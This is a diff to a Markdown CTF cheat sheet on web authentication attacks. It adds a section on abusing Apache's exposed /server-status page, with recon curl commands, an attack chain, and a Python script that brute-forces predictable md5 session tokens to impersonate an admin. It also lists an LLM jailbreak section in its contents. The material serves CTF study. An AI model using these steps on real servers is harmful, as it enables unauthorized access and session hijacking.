@@ -22,6 +22,7 @@
 - [LLM Jailbreak with Safety Model Category Gaps (UTCTF 2026)](#llm-jailbreak-with-safety-model-category-gaps-utctf-2026)
 - [Open Redirect Chains](#open-redirect-chains)
 - [Subdomain Takeover](#subdomain-takeover)
+- [Apache mod_status Information Disclosure + Session Forging (29c3 CTF 2012)](#apache-mod_status-information-disclosure--session-forging-29c3-ctf-2012)
 
 For JWT/JWE token attacks, see [auth-jwt.md](auth-jwt.md). For OAuth/OIDC, SAML, CI/CD credential theft, and infrastructure auth attacks, see [auth-infra.md](auth-infra.md).
 
@@ -318,7 +319,7 @@ app.all("/api/export/chat", (req, res, next) => {
 
 ## IDOR on Unauthenticated WIP Endpoints (srdnlenCTF 2026)
 
-**Pattern (MSN Revive):** A "work-in-progress" endpoint (`/api/export/chat`) is missing both `@login_required` decorator and resource ownership checks (`is_member`). Any user (or unauthenticated request) can access any resource by providing its ID.
+**Pattern (MSN Revive):** An IDOR (Insecure Direct Object Reference) vulnerability — a "work-in-progress" endpoint (`/api/export/chat`) is missing both `@login_required` decorator and resource ownership checks (`is_member`). Any user (or unauthenticated request) can access any resource by providing its ID.
 
 **Reconnaissance:**
 1. Search source code for comments like `WIP`, `TODO`, `FIXME`, `temporary`, `debug`
@@ -559,3 +560,53 @@ curl -v https://suspicious-subdomain.target.com
 | Fastly | CNAME to Fastly | "Fastly error: unknown domain" |
 
 **Tools:** `subjack`, `nuclei -t takeovers/`, `can-i-take-over-xyz` (reference list)
+
+---
+
+## Apache mod_status Information Disclosure + Session Forging (29c3 CTF 2012)
+
+**Pattern:** Apache's `mod_status` endpoint (`/server-status`) is left enabled and accessible, leaking active request URLs, client IP addresses, and request parameters. Combined with session pattern analysis, this enables session forging to impersonate authenticated users.
+
+**Reconnaissance:**
+```bash
+# Check if mod_status is enabled
+curl http://target/server-status
+curl http://target/server-status?auto   # machine-readable format
+
+# Also try common info-leak endpoints
+curl http://target/server-info          # mod_info (Apache config details)
+curl http://target/.htaccess            # sometimes readable
+```
+
+**Information leaked by /server-status:**
+- Active request URLs (including admin panels like `/admin`)
+- Client IP addresses of authenticated users
+- Query parameters and POST data fragments
+- Virtual host configurations
+- Worker thread status and request duration
+
+**Attack chain:**
+1. Discover `/server-status` is accessible
+2. Identify admin endpoints (e.g., `/admin`) and admin IP addresses from active requests
+3. Analyze session token patterns from visible `Cookie` or `Set-Cookie` headers
+4. Forge a valid session token by reproducing the pattern (e.g., predictable session IDs based on IP, timestamp, or username)
+5. Replay the forged session to access admin functionality
+
+```bash
+# Extract admin session info from server-status
+curl -s http://target/server-status | grep -i 'admin\|session\|cookie'
+
+# If session tokens follow a predictable pattern (e.g., md5(username+ip+timestamp)):
+python3 -c "
+import hashlib, time
+admin_ip = '10.0.0.1'  # observed from server-status
+ts = int(time.time())
+for offset in range(-10, 10):
+    token = hashlib.md5(f'admin{admin_ip}{ts+offset}'.encode()).hexdigest()
+    print(token)
+"
+```
+
+**Key insight:** `/server-status` is a goldmine for session analysis — it reveals who is authenticated, what endpoints exist, and sometimes exposes session tokens directly. Always check for it during reconnaissance. The endpoint is enabled by default in many Apache installations and is often left accessible due to misconfigured `<Location>` directives.
+
+**Detection:** During initial recon, check `/server-status`, `/server-info`, and `/status`. If the response contains HTML with worker tables and request details, `mod_status` is active. Automated scanners like `nikto` and `nuclei` flag this automatically.
